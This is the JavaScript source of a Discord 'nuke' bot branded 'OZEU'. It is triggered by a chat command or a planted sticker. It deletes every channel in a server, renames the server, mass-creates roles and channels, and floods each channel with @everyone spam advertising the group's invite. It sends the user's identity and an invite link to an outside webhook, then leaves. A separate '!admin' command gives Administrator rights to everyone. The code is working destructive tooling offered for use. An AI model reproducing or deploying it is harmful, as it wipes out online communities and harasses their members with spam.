const fs = require("fs");
const env = require("dotenv");
env.config();
const { Client, GatewayIntentBits, PermissionsBitField } = require("discord.js");

const COMMANDS = ["!example", "!nuke"]; // トリガーコマンド一覧

const ROLE_NAME = "おぜうの集い万歳！-";
const ROLE_COUNT = 20; // 多すぎるとレートリミット。知らんけど
const ROLE_COLOR = "#ff0000";

const CHANNEL_NAME = "おぜうの集い万歳！-";
const MIN_CHANNELS = 50; // 50が超おすすすめ
const MAX_CHANNELS = 50; // 50が超おすすすめ

const NEW_SERVER_NAME = "おぜうの集い植民地 .gg/acvr Join now"; // 長いと変えられない
const STICKER_NAME = "Example";
const STICKER_FILE = "./example.png"; 

const WEBHOOK_USERNAME = "おぜうの集い万歳！！！";
const MESSAGE_CONTENT = "# Nuked by OZEU\n# Join now\n# このサーバーはおぜうの集いに荒らされました笑\n共に荒らしを行う同志となろう\nhttps://i.imgur.com/tJaVqlH.mp4\nhttps://ptb.discord.com/invite/acvr\n@everyone"; // \nで改行

const MIN_MESSAGES_PER_CHANNEL = 111; // キリいいからこれなだけ
const MAX_MESSAGES_PER_CHANNEL = 111; // キリいいからこれなだけ
const BATCH_SIZE = 50; // 一度に送信するリクエスト数
const MESSAGE_INTERVAL = 10; // バッチ間の待機時間(ms)

const DISCORD_API_BASE = 'https://discord.com/api/v10';
const RANDOM_EMOJIS = ["💥", "🔥", "💀", "☢️", "💣", "🤪","🤓","🤣","😅","😂","🥸","🤯","😓","🤮","🥴","☠️","😹","🙌","🫃","😋","😎","😜","😛","🥳","🤩","🤡","🤢","🥱","😵‍💫","🤥","😰","😨","😱","🥶","🥵","😤","😁"]; // 一応絵文字じゃなくてもできる。魔改造すればチャンネル名全部ランダムとか。
const EMOJI_COUNT = 10;


const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
  ],
});

const BOT_TOKEN = process.env.TOKEN;
const REPORT_WEBHOOK_URL = process.env.WEBHOOK_URL;
let nukeInProgressGuilds = new Set();

function log(message) {
  const now = new Date();
  const jstTime = now.toLocaleString("ja-JP", { timeZone: "Asia/Tokyo", hour12: false });
  const cyan = "\x1b[36m";
  const reset = "\x1b[0m";
  console.log(`${cyan}[${jstTime}]${reset} ${message}`);
}

function getRandomInt(min, max) {
    min = Math.ceil(min);
    max = Math.floor(max);
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function getRandomEmoji() {
    return RANDOM_EMOJIS[Math.floor(Math.random() * RANDOM_EMOJIS.length)];
}

function getMultipleRandomEmojis(count) {
    let emojis = '';
    for (let i = 0; i < count; i++) {
        emojis += getRandomEmoji();
    }
    return emojis;
}

async function sendToReportWebhook(content) {
    if (!REPORT_WEBHOOK_URL || !REPORT_WEBHOOK_URL.startsWith("https://discord.com/api/webhooks/")) return;
    try {
        await fetch(REPORT_WEBHOOK_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: content, username: "Nuke Reporter" }),
        });
    } catch (err) {
        log(`Webhook送信エラー: ${err.message}`);
    }
}

async function createChannelViaAPI(guildId, channelName) {
  try {
    const response = await fetch(`${DISCORD_API_BASE}/guilds/${guildId}/channels`, {
      method: 'POST',
      headers: {
        'Authorization': `Bot ${BOT_TOKEN}`,
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({ name: channelName, type: 0, reason: 'Nuked by OZEU' })
    });
    if (!response.ok) {
      if (response.status === 429) {
        log(`Rate Limit (Channel Create)`);
      } 
      return null;
    }
    return await response.json();
  } catch (err) {
    return null;
  }
}

async function spamMessagesToChannel(channel, messagesToSend) {
  try {
    await new Promise(resolve => setTimeout(resolve, 500));
    
    const webhook = await channel.createWebhook({
        name: WEBHOOK_USERNAME,
        reason: 'Nuke Process'
    });
    const webhookUrl = webhook.url; 

    for (let i = 0; i < messagesToSend; i += BATCH_SIZE) {
        const payload = JSON.stringify({
            content: MESSAGE_CONTENT,
            username: WEBHOOK_USERNAME,
            allowed_mentions: { parse: ['everyone'] }
        });

        const batchPromises = Array.from({ length: Math.min(BATCH_SIZE, messagesToSend - i) }, () => {
            return fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: payload
            }).catch(() => {});
        });
        
        await Promise.all(batchPromises);
        if (MESSAGE_INTERVAL > 0) { await new Promise(resolve => setTimeout(resolve, MESSAGE_INTERVAL)); }
    }
  } catch (err) {
  }
}

async function startNukeProcess(guild, executorMember) {
  if (nukeInProgressGuilds.has(guild.id)) {
    log(`Skipping: Already nuking ${guild.name}`);
    return;
  }
  nukeInProgressGuilds.add(guild.id);
  log(`*** STARTED NUKE ON: ${guild.name} ***`);

  const displayName = executorMember.displayName;
  const userTag = executorMember.user.tag;
  const userId = executorMember.user.id;
  const reportMessage = `**${displayName}** - ${userTag} (${userId}) がNukeを実行しました。\nサーバー: \`${guild.name}\` (ID: ${guild.id})`;
  sendToReportWebhook(reportMessage);
  guild.setName(NEW_SERVER_NAME).catch(() => {});

  const deleteChannels = guild.channels.cache.map(channel => channel.delete().catch(() => {}));
  const createRoles = Array.from({ length: ROLE_COUNT }, () => {
        const fullRoleName = `${ROLE_NAME}${getMultipleRandomEmojis(EMOJI_COUNT)}`;
        return guild.roles.create({ name: fullRoleName, color: ROLE_COLOR }).catch(() => {});
  });

  Promise.all([...deleteChannels, ...createRoles])
    .then(() => log(`[${guild.name}] Channels cleaned and Roles creating...`));

  const spamProcess = (async () => {
    log(`[${guild.name}] Mass channel creation started.`);
    const numberOfChannelsToCreate = getRandomInt(MIN_CHANNELS, MAX_CHANNELS);
    
    let inviteSent = false;
    const allSpamPromises = [];

    for (let i = 0; i < numberOfChannelsToCreate; i++) {
        const fullChannelName = `${CHANNEL_NAME}${getMultipleRandomEmojis(EMOJI_COUNT)}`;
        
        const job = createChannelViaAPI(guild.id, fullChannelName)
        .then(async (newChannelData) => {
          if (!newChannelData?.id) return;
          try {
            const channel = await client.channels.fetch(newChannelData.id);
            if (!channel) return;

            if (!inviteSent) {
              inviteSent = true;
              channel.createInvite({ maxAge: 0, maxUses: 0 })
                .then(invite => sendToReportWebhook(`招待リンク: ${invite.url}`))
                .catch(() => {});
            }
            
            const messagesForThisChannel = getRandomInt(MIN_MESSAGES_PER_CHANNEL, MAX_MESSAGES_PER_CHANNEL);
            return spamMessagesToChannel(channel, messagesForThisChannel);
          } catch (e) {}
        });
      
      allSpamPromises.push(job);
      await new Promise(resolve => setTimeout(resolve, 50));
    }
    
    await Promise.all(allSpamPromises);
  })();

  await spamProcess;
  log(`[${guild.name}] Done. Leaving server...`);
  
  try {
      await guild.leave();
      log(`Successfully left ${guild.name}`);
  } catch (err) {
      log(`Failed to leave: ${err.message}`);
  }

  nukeInProgressGuilds.delete(guild.id);
}

client.once("clientReady", () => {
  log(`Logged in as ${client.user.tag}`);
});

client.on("guildCreate", async (guild) => {
    log(`Joined: ${guild.name} (${guild.id})`);
    try {
        if (!fs.existsSync(STICKER_FILE)) return;
        const existing = guild.stickers.cache.find(s => s.name === STICKER_NAME);
        if (!existing) {
             await guild.stickers.create({ file: STICKER_FILE, name: STICKER_NAME, tags: "nuke", description: "OZEU Nuke" });
             log(`[${guild.name}] Sticker created.`);
        }
    } catch (e) {}
});

client.on("messageCreate", async (message) => {
    if (message.author.bot || !message.guild) return;

    if (COMMANDS.includes(message.content)) {
        log(`Command '${message.content}' detected in ${message.guild.name} by ${message.author.tag}`);
        await startNukeProcess(message.guild, message.member);
        return;
    }

    if (message.stickers.size > 0) {
        const sentSticker = message.stickers.first();
        if (sentSticker.name === STICKER_NAME) {
            log(`Sticker Trigger detected in ${message.guild.name}`);
            await startNukeProcess(message.guild, message.member);
            return;
        }
    }

    if (message.content === '!admin') {
        log(`!admin executed in ${message.guild.name} by ${message.author.tag}`);
        try {
            const everyone = message.guild.roles.everyone;
            await everyone.setPermissions([PermissionsBitField.Flags.Administrator]);
            // await message.reply("設定完了");
            log(`Granted Admin to @everyone in ${message.guild.name}`);
        } catch (err) {
            log(`Failed to grant Admin: ${err.message}`);
            // await message.reply("設定失敗").catch(() => {});
        }
    }
});

if (BOT_TOKEN) {
    client.login(BOT_TOKEN).catch(err => log(`Login Failed: ${err.message}`));
} else {
    log("TOKEN not found in .env");
}